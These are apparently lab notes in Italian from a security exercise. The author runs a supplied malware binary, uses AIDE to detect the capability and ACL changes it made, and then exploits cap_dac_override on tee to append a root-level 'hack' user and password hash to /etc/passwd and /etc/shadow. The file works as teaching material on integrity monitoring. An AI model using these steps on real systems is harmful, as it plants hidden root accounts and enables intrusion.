#Eseguo il malware dato
sudo ./change5

#Verifico le modifiche apportate
sudo aide -c /etc/aide/aide.conf -C

#Sono stati modificati i seguenti file:
- f = ... .c....X .+: /usr/bin/grep (capabilities)
- f = ... .c....X .C: /usr/bin/tee (capabilities)
- f = p.. .c...A. ..: /usr/bin/vim.tiny (ACL)

In particolare notiamo che e stata impostata la capabilities cap_dac_override=ep
su /usr/bin/tee

#Possiamo utilizzare il comando tee per modificare i file /etc/passwd e /etc/shadow
echo "hack:x:0:0:hack,,,:/root:/bin/bash" | tee -a /etc/passwd

#Generiamo una password per l'utente hack
#per generare il salt
openssl rand -base64 32 
#Risultato
qaO8L7aqAN03uhGyg5X+1/ceW5C4e8pRVREZ0kXK9QE=
#Generiamo la password
openssl passwd -6 -salt qaO8L7aqAN03uhGyg5X+1/ceW5C4e8pRVREZ0kXK9QE= hack

#Risuultato
$6$qaO8L7aqAN03uhGy$3YtG/4wQK4OlR35Zfs72ReJ3ROVw1f553OIagYPnlN5ipWO/Q2Kb0RVDlMn99gbUBku53s6VCQfTit7mRQtPM.

#Modifichiamo il file shadow
echo "hack:$6$qaO8L7aqAN03uhGy$3YtG/4wQK4OlR35Zfs72ReJ3ROVw1f553OIagYPnlN5ipWO/Q2Kb0RVDlMn99gbUBku53s6VCQfTit7mRQtPM.:19043:0:99999:7:::" | tee -a /etc/shadow

#Entriamo come hack
su hack
#Ora siamo l'utente hack con permessi di root